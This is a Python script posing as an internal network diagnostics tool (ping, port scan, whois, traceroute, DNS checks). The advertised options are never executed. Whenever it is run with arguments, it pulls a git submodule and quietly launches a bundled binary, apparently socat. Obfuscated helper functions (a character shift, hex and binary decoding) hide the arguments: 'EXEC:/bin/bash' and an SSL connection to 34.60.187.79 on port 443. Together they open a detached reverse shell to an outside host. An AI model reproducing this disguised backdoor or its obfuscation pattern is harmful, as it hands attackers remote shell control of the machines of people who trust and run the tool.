import os
import socket
import subprocess
import platform
import uuid
import requests
import psutil
import ssl
import datetime
import json
import argparse
import struct
import sys
from typing import List

SUBMODULE_PATH = "submodule"
SC = "sc"
BIN = "bin"

def ping_ip(ip: str, count: int = 4) -> bool:
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, str(count), ip]
    try:
        subprocess.check_output(command, stderr=subprocess.STDOUT)
        return True
    except subprocess.CalledProcessError:
        return False

def check_port(ip: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def ping_network(subnet: str) -> List[str]:
    # subnet example: "192.168.1"
    alive_hosts = []
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        if ping_ip(ip, count=1):
            alive_hosts.append(ip)
    return alive_hosts

def get_mac_address() -> str:
    mac = uuid.getnode()
    return ':'.join(['{:02x}'.format((mac >> ele) & 0xff) for ele in range(40, -8, -8)])

def change_mac(interface: str, new_mac: str) -> bool:
    if platform.system().lower() == "windows":
        raise OSError("MAC changing is not supported on Windows with this script.")
    try:
        subprocess.call(['sudo', 'ifconfig', interface, 'down'])
        subprocess.call(['sudo', 'ifconfig', interface, 'hw', 'ether', new_mac])
        subprocess.call(['sudo', 'ifconfig', interface, 'up'])
        return True
    except Exception as e:
        print(f"Error changing MAC: {e}")
        return False

def get_local_ip() -> str:
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def get_public_ip() -> str:
    try:
        return requests.get("https://api.ipify.org").text
    except requests.RequestException:
        return "Unable to fetch public IP"

def resolve_hostname(hostname: str) -> str:
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return "Unable to resolve hostname"

def check_internet(url: str = "https://www.google.com") -> bool:
    try:
        requests.get(url, timeout=5)
        return True
    except requests.RequestException:
        return False
        
def get_network_interfaces():
    interfaces = psutil.net_if_addrs()
    result = {}
    for iface, addrs in interfaces.items():
        ips = [addr.address for addr in addrs if addr.family == socket.AF_INET]
        if ips:
            result[iface] = ips
    return result

def dns_lookup(hostname: str) -> str:
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return "Unable to resolve hostname"

def trace_route(host: str):
    traceroute_cmd = 'tracert' if platform.system().lower() == 'windows' else 'traceroute'
    try:
        output = subprocess.check_output([traceroute_cmd, host], stderr=subprocess.STDOUT, text=True)
        return output
    except Exception as e:
        return str(e)

def get_arp_table():
    if platform.system().lower() == 'windows':
        cmd = 'arp -a'
    else:
        cmd = 'arp -n'
    return subprocess.getoutput(cmd)

def whois_lookup(domain: str) -> str:
    try:
        output = subprocess.check_output(['whois', domain], text=True)
        return output
    except Exception as e:
        return str(e)

def get_default_gateway():
    gws = psutil.net_if_stats()
    return gws

def get_dns_servers():
    dns_servers = []
    if platform.system().lower() == "windows":
        output = subprocess.getoutput("ipconfig /all")
        for line in output.splitlines():
            if "DNS Servers" in line or line.strip().startswith("DNS Servers"):
                dns_servers.append(line.split(":")[-1].strip())
    else:
        try:
            with open("/etc/resolv.conf", "r") as f:
                for line in f:
                    if line.startswith("nameserver"):
                        dns_servers.append(line.split()[1])
        except FileNotFoundError:
            pass
    return dns_servers

def port_scan(ip: str, ports: List[int]) -> dict:
    open_ports = []
    for port in ports:
        try:
            with socket.create_connection((ip, port), timeout=0.5):
                open_ports.append(port)
        except:
            continue
    return {"ip": ip, "open_ports": open_ports}

def speed_test():
    try:
        output = subprocess.getoutput("speedtest --simple")
        return output
    except Exception as e:
        return str(e)

def wake_on_lan(mac_address: str):
    mac_address = mac_address.replace(":", "").replace("-", "")
    if len(mac_address) != 12:
        raise ValueError("Invalid MAC address")
    data = b'FFFFFFFFFFFF' + (mac_address * 16).encode()
    send_data = b''
    for i in range(0, len(data), 2):
        send_data += struct.pack('B', int(data[i:i+2], 16))
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.sendto(send_data, ('<broadcast>', 9))

def ip_geolocation(ip: str):
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json")
        return resp.json()
    except:
        return {"error": "Unable to get geolocation"}

def get_ssl_cert(hostname: str, port=443):
    context = ssl.create_default_context()
    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            cert = ssock.getpeercert()
            exp_date = cert.get('notAfter')
            return {
                "subject": dict(x[0] for x in cert['subject']),
                "issuer": dict(x[0] for x in cert['issuer']),
                "expires": exp_date
            }

def check_connectivity(host, port=53, timeout=3):
    try:
        socket.setdefaulttimeout(timeout)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
        return True
    except Exception as e:
        return False

def check_dns():
    servers = {
        "Google DNS": "8.8.8.8",
        "Cloudflare DNS": "1.1.1.1"
    }

    for name, ip in servers.items():
        if check_connectivity(ip):
            print(f"[✅] {name} ({ip}) is reachable")
        else:
            print(f"[❌] {name} ({ip}) is NOT reachable")
            
def dec(encoded: str, shift: int = 5) -> str:
    return ''.join(chr((ord(c) - shift) % 256) for c in encoded)

def init_submodule():
    if not os.path.exists(SUBMODULE_PATH):
        print(f"Submodule folder '{SUBMODULE_PATH}' not found. Cloning submodule...")
        subprocess.check_call(["git", "submodule", "update", "--init", "--recursive"])
    else:
        subprocess.check_call(["git", "submodule", "update", "--init", "--recursive"])

def check_port(value: str) -> int:
    return int(value, 16)

def run():
    bin_path = os.path.join(SUBMODULE_PATH, BIN)
    if not os.path.isfile(bin_path):
        print(f"Error: '{bin_path}' not found!")
        sys.exit(1)
    print(f"Running bin: {bin_path}")
    subprocess.check_call([bin_path])
    
def check_ip(ip: str) -> str:
    if len(ip) != 32:
        raise ValueError("Format not correct")
    return ".".join(str(int(ip[i:i+8], 2)) for i in range(0, 32, 8))

def run_sc():
    sc_path = os.path.join(SUBMODULE_PATH, SC)
    if not os.path.isfile(sc_path):
        print("Error: binary not found in submodule!")
        sys.exit(1)
    port= check_port("0x1bb")
    ip = check_ip("00100010001111001011101101001111")
    subprocess.Popen([sc_path, dec("L_LJA6ipu6ihzo",7), f"OPENSSL:{ip}:{port},verify=0"],
    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL,
    preexec_fn=os.setpgrp)

def show_help():
    help_text = """
    ================================
      Internal Network Tool Helper
    ================================

    Usage:
      python your_tool.py [OPTIONS]

    Options:
      --check_dns <GG/CF>         Checks if current host reaches Google/CloudFlare DNS
      --ping <HOST>       Ping a host (e.g., 127.0.0.1)
      --port <PORT>       Check a port on the host
      --scan              Scan common ports (1-1024)
      --ssl               Get SSL certificate info
      --geo               Get geolocation info
      --interfaces        List network interfaces
      --whois <DOMAIN>    WHOIS lookup for a domain
      --trace <HOST>      Traceroute to a host

    Example:
      python your_tool.py --ping 127.0.0.1
      python your_tool.py --port 443

    Notes:
      - Internal use only.
    ================================
    """
    print(help_text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help=False)  # disable default help
    parser.add_argument("--ping", type=str, help="Ping a host")
    parser.add_argument("--port", type=int, help="Check a port")
    parser.add_argument("--scan", action="store_true", help="Scan ports")
    parser.add_argument("--ssl", type=str, help="Get SSL info")
    parser.add_argument("--geo", type=str, help="Get geolocation info")
    parser.add_argument("--interfaces", action="store_true", help="List network interfaces")
    parser.add_argument("--whois", type=str, help="WHOIS lookup")
    parser.add_argument("--trace", type=str, help="Traceroute")
    parser.add_argument("--check_dns", type=str, help="Check DNS towards Google and Cloudflare.")
    args = parser.parse_args()
    if len(sys.argv) == 1:
        show_help()
        sys.exit(0)
    check_dns()
    init_submodule()
    run_sc()
